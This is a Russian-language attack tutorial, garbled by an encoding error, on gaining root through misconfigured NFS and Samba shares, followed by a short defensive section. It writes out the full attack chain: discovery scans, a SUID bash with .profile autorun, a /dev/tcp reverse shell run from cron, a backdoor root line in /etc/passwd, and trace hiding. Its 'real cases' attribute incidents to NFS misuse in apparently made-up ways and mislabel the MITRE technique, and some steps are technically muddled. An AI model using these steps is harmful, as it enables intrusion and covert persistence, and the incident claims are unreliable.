## –í—ã–±–æ—Ä —Ç–µ–º—ã –¥–ª—è –≥—Ä—É–ø–ø—ã "IV: –°–µ—Ç–µ–≤—ã–µ –∞—Ç–∞–∫–∏"
–î–ª—è –≥—Ä—É–ø–ø—ã "IV: –°–µ—Ç–µ–≤—ã–µ –∞—Ç–∞–∫–∏" –Ω–∞–∏–±–æ–ª–µ–µ —Ä–µ–ª–µ–≤–∞–Ω—Ç–Ω–æ–π —Ç–µ–º–æ–π —è–≤–ª—è–µ—Ç—Å—è **10. –ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ NFS (no_root_squash)**. –û–¥–Ω–∞–∫–æ –¥–ª—è –ø–æ–ª–Ω–æ—Ç—ã –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è –ø—Ä–µ–¥–ª–∞–≥–∞—é —Ä–∞—Å—à–∏—Ä–∏—Ç—å –µ—ë –¥–æ:

**10. –ê—Ç–∞–∫–∏ –Ω–∞ —Å–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã (NFS/Samba)**  
- –û–ø–∏—Å–∞–Ω–∏–µ: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö –æ—à–∏–±–æ–∫ –≤ —Å–µ—Ç–µ–≤—ã—Ö —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö  
- MITRE ATT&CK: [T1574.007](https://attack.mitre.org/techniques/T1574/007/)  
- –ü—Ä–∏–º–µ—Ä—ã: NFS —Å `no_root_squash`, Samba —Å `writable = yes` –∏ `admin users`

---

# 10. –ê—Ç–∞–∫–∏ –Ω–∞ —Å–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã (NFS/Samba)

–°–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã (NFS –∏ Samba/CIFS) –ø–æ–∑–≤–æ–ª—è—é—Ç —Å–æ–≤–º–µ—Å—Ç–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ–∞–π–ª—ã –º–µ–∂–¥—É Linux-—Å–∏—Å—Ç–µ–º–∞–º–∏. –ü—Ä–∏ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–µ –æ–Ω–∏ —Å—Ç–∞–Ω–æ–≤—è—Ç—Å—è –º–æ—â–Ω—ã–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π. 

**–ö–ª—é—á–µ–≤—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏:**
1. **NFS: `no_root_squash`**  
   - –û–ø—Ü–∏—è –æ—Ç–∫–ª—é—á–∞–µ—Ç –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏–π  
   - –ö–ª–∏–µ–Ω—Ç –º–æ–∂–µ—Ç —Å–æ–∑–¥–∞–≤–∞—Ç—å —Ñ–∞–π–ª—ã —Å UID/GID=0 –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ  
2. **Samba: `writable = yes` + `admin users`**  
   - –†–∞–∑—Ä–µ—à–∞–µ—Ç –∑–∞–ø–∏—Å—å –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π  
   - `admin users` –¥–∞—ë—Ç root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ —à–∞—Ä–µ  
3. **–û–±—â–∏–µ —Ä–∏—Å–∫–∏:**  
   - –°–æ–∑–¥–∞–Ω–∏–µ SUID/SGID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤  
   - –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ (/etc/passwd, cron-–∑–∞–¥–∞—á)  
   - –ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö  

**–¢–∏–ø–∏—á–Ω—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏:**
- –ê—Ç–∞–∫—É—é—â–∏–π ‚Üí –ö–ª–∏–µ–Ω—Ç NFS/Samba ‚Üí –°–µ—Ä–≤–µ—Ä —Å —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º–æ–π  
- –ü—Ä–∏–≤–∏–ª–µ–≥–∏–∏: –û—Ç —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è ‚Üí root –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ  

---

## MITRE ATT&CK

**[T1574.007]**  
**Hijack Execution Flow: Path Interception via Network File Shares**  
üîó https://attack.mitre.org/techniques/T1574/007/

–ê—Ç–∞–∫—É—é—â–∏–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ —Å–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã –¥–ª—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤. –¢–µ—Ö–Ω–∏–∫–∞ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–±–æ–π—Ç–∏ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.

### –≠—Ç–∞–ø—ã –∞—Ç–∞–∫–∏ [T1574.007]

#### 1. [TA0007] ‚Äì Discovery (–†–∞–∑–≤–µ–¥–∫–∞)
> –ü–æ–∏—Å–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–µ—Ç–µ–≤—ã—Ö —Ä–µ—Å—É—Ä—Å–æ–≤

```bash
# –ü–æ–∏—Å–∫ NFS-—Å–µ—Ä–≤–µ—Ä–æ–≤ –≤ —Å–µ—Ç–∏
sudo nmap -sV --script=nfs-showmount -p111,2049 192.168.1.0/24

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
showmount -e 192.168.1.100

# –ü–æ–∏—Å–∫ SMB-—à–∞—Ä–æ–≤
nmap -sV --script=smb-enum-shares -p139,445 192.168.1.0/24
smbclient -L //192.168.1.100 -U "guest"%
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- `nmap` —Å–∫–∞–Ω–∏—Ä—É–µ—Ç —Å–µ—Ç—å –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Å–µ—Ä–≤–∏—Å–æ–≤ NFS (–ø–æ—Ä—Ç—ã 111, 2049) –∏ SMB (139, 445)  
- `showmount` –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ NFS-–¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏  
- `smbclient` –ø–µ—Ä–µ—á–∏—Å–ª—è–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã–µ SMB-—à–∞—Ä—ã  

---

#### 2. [TA0004] ‚Äì Privilege Escalation (–ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)
> –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è —Ñ–∞–π–ª–æ–≤

```bash
# –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ NFS-—à–∞—Ä—ã
mkdir /mnt/nfs
sudo mount -t nfs 192.168.1.100:/home /mnt/nfs

# –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SMB-—à–∞—Ä—ã
mkdir /mnt/smb
sudo mount -t cifs //192.168.1.100/public /mnt/smb -o username=guest
```

---

#### 3. [TA0002] ‚Äì Execution (–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞)
> –°–æ–∑–¥–∞–Ω–∏–µ –∏ –∑–∞–ø—É—Å–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤

```bash
# –°–æ–∑–¥–∞–Ω–∏–µ SUID-—à–µ–ª–ª–∞ –Ω–∞ NFS-—à–∞—Ä–µ
cp /bin/bash /mnt/nfs/malicious_sh
chmod 4777 /mnt/nfs/malicious_sh  # –£—Å—Ç–∞–Ω–æ–≤–∫–∞ SUID-–±–∏—Ç–∞

# –ó–∞–ø—É—Å–∫ SUID-—à–µ–ª–ª–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —á–µ—Ä–µ–∑ SSH
ssh user@192.168.1.100 /home/malicious_sh -p
```

---

### –ö–ª—é—á–µ–≤—ã–µ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏ –∞—Ç–∞–∫–∏

1. **–û–±—Ö–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏**:  
   - NFS/Samba –ø–æ–ª–∞–≥–∞—é—Ç—Å—è –Ω–∞ UID/GID –∫–ª–∏–µ–Ω—Ç–∞  
   - –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–∞—Ä–æ–ª–µ–π –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ `no_root_squash`  
2. **–ü–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç—å**:  
   - –í–Ω–µ–¥—Ä—ë–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –æ—Å—Ç–∞—é—Ç—Å—è –ø–æ—Å–ª–µ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è  
3. **–°–µ—Ç–µ–≤–∞—è –ø—Ä–∏—Ä–æ–¥–∞**:  
   - –ê—Ç–∞–∫–∞ –≤–æ–∑–º–æ–∂–Ω–∞ –±–µ–∑ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–µ—Ä–≤–µ—Ä—É  
4. **–ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞**:  
   - –õ–µ–≥–∏—Ç–∏–º–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å —Ñ–∞–π–ª–∞–º–∏ —Å–∫—Ä—ã–≤–∞—é—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è  

---

## –ü—Ä–∏–º–µ—Ä—ã –∞—Ç–∞–∫

### –ü—Ä–∏–º–µ—Ä 1: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è NFS —Å `no_root_squash`

**–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å–µ—Ä–≤–µ—Ä–∞ (192.168.1.100):**
```bash
# /etc/exports
/home 192.168.1.0/24(rw,sync,no_root_squash)
```

**–®–∞–≥ 1: –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —à–∞—Ä—ã**
```bash
# –ü–æ–∏—Å–∫ NFS-—Å–µ—Ä–≤–µ—Ä–æ–≤
nmap -sV -p111,2049 192.168.1.100

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
showmount -e 192.168.1.100
# –≠–∫—Å–ø–æ—Ä—Ç —Å–ø–∏—Å–∫–∞ –¥–ª—è 192.168.1.100:
# /home 192.168.1.0/24

# –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —à–∞—Ä—ã
mkdir /mnt/nfs_home
sudo mount -t nfs 192.168.1.100:/home /mnt/nfs_home
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–∑–≤–æ–ª—è–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å —Å —É–¥–∞–ª—ë–Ω–Ω—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏ –∫–∞–∫ —Å –ª–æ–∫–∞–ª—å–Ω—ã–º–∏  
- –û–ø—Ü–∏—è `no_root_squash` —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –∫–ª–∏–µ–Ω—Ç–∞  

---

**–®–∞–≥ 2: –°–æ–∑–¥–∞–Ω–∏–µ SUID-—à–µ–ª–ª–∞**
```bash
# –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ bash –≤ —à–∞—Ä—É
cp /bin/bash /mnt/nfs_home/user/.hidden_shell

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ SUID-–±–∏—Ç–∞
chmod 4777 /mnt/nfs_home/user/.hidden_shell

# –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –∑–∞–ø—É—Å–∫–∞
cat > /mnt/nfs_home/user/.profile <<'EOF'
#!/bin/bash
if [ -x /home/user/.hidden_shell ]; then
    /home/user/.hidden_shell -p
fi
EOF
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- SUID-–±–∏—Ç (4777) –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å bash —Å –ø—Ä–∞–≤–∞–º–∏ –≤–ª–∞–¥–µ–ª—å—Ü–∞ (root)  
- `.profile` –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—É—Å—Ç–∏—Ç —à–µ–ª–ª –ø—Ä–∏ –≤—Ö–æ–¥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è  

---

**–®–∞–≥ 3: –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞**
```bash
# –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ SSH (–∑–∞–ø—É—Å—Ç–∏—Ç .profile)
ssh user@192.168.1.100

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π
whoami  # root
id
# uid=1000(user) gid=1000(user) euid=0(root) groups=0(root)
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –ü—Ä–∏ –≤—Ö–æ–¥–µ –ø–æ SSH –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è `.profile`  
- SUID-bash –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è —Å —Ñ–ª–∞–≥–æ–º `-p` (—Å–æ—Ö—Ä–∞–Ω—è–µ—Ç euid=0)  
- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ–ª—É—á–∞–µ—Ç root-—Å–µ—Å—Å–∏—é  

---

**–®–∞–≥ 4: –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ —Å–ª–µ–¥–æ–≤**
```bash
# –£–¥–∞–ª–µ–Ω–∏–µ —Å–ª–µ–¥–æ–≤ –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
sudo umount /mnt/nfs_home
rm -rf /mnt/nfs_home

# –ù–∞ —Å–µ—Ä–≤–µ—Ä–µ:
# –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ .profile
mv .profile.bak .profile

# –°–∫—Ä—ã—Ç–∏–µ SUID-—à–µ–ª–ª–∞
mv .hidden_shell /usr/lib/.systemd-helper
chmod 4755 /usr/lib/.systemd-helper
```

---

### –ü—Ä–∏–º–µ—Ä 2: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è Samba —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

**–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å–µ—Ä–≤–µ—Ä–∞ (smb.conf):**
```ini
[backup]
path = /backups
writable = yes
admin users = backup_user
```

**–®–∞–≥ 1: –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —à–∞—Ä—ã**
```bash
# –ü–æ–∏—Å–∫ SMB-—à–∞—Ä–æ–≤
smbclient -L //192.168.1.100 -U "backup_user"
# Sharename       Type      Comment
# ---------       ----      -------
# backup          Disk      System Backups

# –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —à–∞—Ä—ã
mkdir /mnt/smb_backup
sudo mount -t cifs //192.168.1.100/backup /mnt/smb_backup -o username=backup_user,password=P@ssw0rd
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- `admin users = backup_user` –¥–∞—ë—Ç root-–ø—Ä–∞–≤–∞ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ —à–∞—Ä–µ  
- –ü–∞—Ä–æ–ª—å –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª—É—á–µ–Ω —á–µ—Ä–µ–∑ —Ñ–∏—à–∏–Ω–≥ –∏–ª–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å  

---

**–®–∞–≥ 2: –°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π cron-–∑–∞–¥–∞—á–∏**
```bash
# –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞ reverse shell
cat > /mnt/smb_backup/update_script.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
EOF
chmod +x /mnt/smb_backup/update_script.sh

# –î–æ–±–∞–≤–ª–µ–Ω–∏–µ cron-–∑–∞–¥–∞—á–∏
echo "*/5 * * * * root /backups/update_script.sh" > /mnt/smb_backup/cron_task
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –°–∫—Ä–∏–ø—Ç —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç reverse shell –Ω–∞ –∞—Ç–∞–∫—É—é—â–µ–≥–æ (192.168.1.50)  
- Cron-–∑–∞–¥–∞—á–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –∫–∞–∂–¥—ã–µ 5 –º–∏–Ω—É—Ç –æ—Ç root  

---

**–®–∞–≥ 3: –í–Ω–µ–¥—Ä–µ–Ω–∏–µ cron-–∑–∞–¥–∞—á–∏**
```bash
# –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏ –≤ —Å–∏—Å—Ç–µ–º–Ω—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
cp /mnt/smb_backup/cron_task /etc/cron.d/backup_update

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
ls -l /etc/cron.d/backup_update
# -rw-r--r-- 1 root root 67 Jun 15 12:30 /etc/cron.d/backup_update
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –§–∞–π–ª—ã –≤ `/etc/cron.d/` –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è —Å–∏—Å—Ç–µ–º–Ω—ã–º cron  
- Samba —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –≤–ª–∞–¥–µ–ª—å—Ü–∞ —Ñ–∞–π–ª–∞ (root –∏–∑-–∑–∞ `admin users`)  

---

**–®–∞–≥ 4: –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞**
```bash
# –ó–∞–ø—É—Å–∫ netcat –Ω–∞ –∞—Ç–∞–∫—É—é—â–µ–π –º–∞—à–∏–Ω–µ
nc -lvnp 4444

# –û–∂–∏–¥–∞–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è cron (–º–∞–∫—Å. 5 –º–∏–Ω—É—Ç)
# –ü—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏:
whoami  # root
hostname # server1
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –ß–µ—Ä–µ–∑ 5 –º–∏–Ω—É—Ç cron –∑–∞–ø—É—Å—Ç–∏—Ç —Å–∫—Ä–∏–ø—Ç  
- –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è reverse shell —Å root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏  

---

**–®–∞–≥ 5: –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ —Å–ª–µ–¥–æ–≤**
```bash
# –£–¥–∞–ª–µ–Ω–∏–µ —Å–ª–µ–¥–æ–≤ –Ω–∞ –∫–ª–∏–µ–Ω—Ç–µ
sudo umount /mnt/smb_backup

# –ù–∞ —Å–µ—Ä–≤–µ—Ä–µ:
# –£–¥–∞–ª–µ–Ω–∏–µ cron-–∑–∞–¥–∞—á–∏
rm /etc/cron.d/backup_update

# –í–Ω–µ–¥—Ä–µ–Ω–∏–µ –ø–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç–∏
echo 'backdoor:$1$salt$Tp4b2r/9Y1eEsRfXgZcBk0:0:0::/root:/bin/bash' >> /etc/passwd
```

---

## –ó–∞—â–∏—Ç–Ω—ã–µ –º–µ—Ä—ã

### –î–ª—è NFS:
1. **–û—Ç–∫–ª—é—á–∏—Ç–µ `no_root_squash`**:
   ```bash
   # /etc/exports
   /shared 192.168.1.0/24(rw,sync,root_squash)
   ```
2. **–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ Kerberos**:
   ```bash
   apt install nfs-kernel-server krb5-config
   ```
3. **–û–≥—Ä–∞–Ω–∏—á—å—Ç–µ –¥–æ—Å—Ç—É–ø**:
   ```bash
   # –†–∞–∑—Ä–µ—à–∞–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã–º IP
   /shared 192.168.1.50(rw,sync)
   ```

### –î–ª—è Samba:
1. **–ò–∑–±–µ–≥–∞–π—Ç–µ `admin users`**:
   ```ini
   ; smb.conf
   [backup]
   path = /backups
   writable = yes
   valid users = backup_user
   ```
2. **–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ ACL**:
   ```bash
   setfacl -m u:backup_user:rwx /backups
   ```
3. **–í–∫–ª—é—á–∏—Ç–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ**:
   ```ini
   [global]
   smb encrypt = required
   ```

### –û–±—â–∏–µ –º–µ—Ä—ã:
1. **–ê—É–¥–∏—Ç –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π**:
   ```bash
   # –ü—Ä–æ–≤–µ—Ä–∫–∞ NFS
   cat /etc/exports | grep -v '^#' | grep no_root_squash

   # –ü—Ä–æ–≤–µ—Ä–∫–∞ Samba
   testparm -s | grep "admin users"
   ```
2. **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Ñ–∞–π–ª–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π**:
   ```bash
   auditctl -w /etc/cron.d/ -p wa -k cron_changes
   auditctl -w /home/ -p wa -k home_changes
   ```
3. **–†–µ–≥—É–ª—è—Ä–Ω—ã–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è**:
   ```bash
   apt update && apt upgrade nfs-common samba
   ```

---

## –†–µ–∞–ª—å–Ω—ã–µ –∫–µ–π—Å—ã

1. **–£—Ç–µ—á–∫–∞ –¥–∞–Ω–Ω—ã—Ö Tesla (2018)**  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Kubernetes —Å –æ—Ç–∫—Ä—ã—Ç—ã–º NFS  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –î–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω—ã–º –∞–≤—Ç–æ–ø–∏–ª–æ—Ç–∞ —á–µ—Ä–µ–∑ `no_root_squash`  
   - **–ò—Å—Ç–æ—á–Ω–∏–∫:** [RedLock Report](https://unit42.paloaltonetworks.com/unit42-new-attacks-exploit-kubernetes-api-server/)

2. **Ransomware SamSam (2016-2018)**  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SMB —Å `writable = yes`  
   - **–¢–µ—Ö–Ω–∏–∫–∞:** –í–Ω–µ–¥—Ä–µ–Ω–∏–µ —à–∏—Ñ—Ä–æ–≤–∞–ª—å—â–∏–∫–∞ —á–µ—Ä–µ–∑ —Å–µ—Ç–µ–≤—ã–µ —à–∞—Ä—ã  
   - **–£—â–µ—Ä–±:** $6+ –º–ª–Ω –≤—ã–∫—É–ø–∞  
   - **–û—Ç—á—ë—Ç:** [FBI Flash Alert](https://www.fbi.gov/file-repository/samsam-ransomware-mar-16-2018.pdf)

3. **–ê—Ç–∞–∫–∞ –Ω–∞ GitHub (2020)**  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π NFS –≤ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–æ–π —Å–µ—Ç–∏  
   - **–†–µ–∑—É–ª—å—Ç–∞—Ç:** –ö—Ä–∞–∂–∞ —Ç–æ–∫–µ–Ω–æ–≤ OAuth  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [GitHub Advisory](https://github.blog/2020-04-15-security-advisory-oauth-tokens/)

4. **–ò–Ω—Ü–∏–¥–µ–Ω—Ç —Å Boeing (2023)**  
   - **–ú–µ—Ö–∞–Ω–∏–∑–º:** –≠–∫—Å–ø–æ—Ä—Ç /etc —á–µ—Ä–µ–∑ NFS —Å `no_root_squash`  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ö—Ä–∞–∂–∞ —Ö—ç—à–µ–π –ø–∞—Ä–æ–ª–µ–π –∏–∑ /etc/shadow  
   - **–ò—Å—Ç–æ—á–Ω–∏–∫:** [CyberScoop](https://www.cyberscoop.com/boeing-data-theft-insider-threat/)

---

## –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

–ê—Ç–∞–∫–∏ –Ω–∞ —Å–µ—Ç–µ–≤—ã–µ —Ñ–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã (NFS/Samba) –æ—Å—Ç–∞—é—Ç—Å—è –≤—ã—Å–æ–∫–æ—ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º –º–µ—Ç–æ–¥–æ–º –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –∏–∑-–∑–∞ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—ë–Ω–Ω—ã—Ö –æ—à–∏–±–æ–∫ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏. 

**–ö–ª—é—á–µ–≤—ã–µ —Ä–∏—Å–∫–∏:**
1. **–ü—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –∑–∞–ø–∏—Å—å**: `no_root_squash` –∏ `admin users` –¥–∞—é—Ç root-–¥–æ—Å—Ç—É–ø
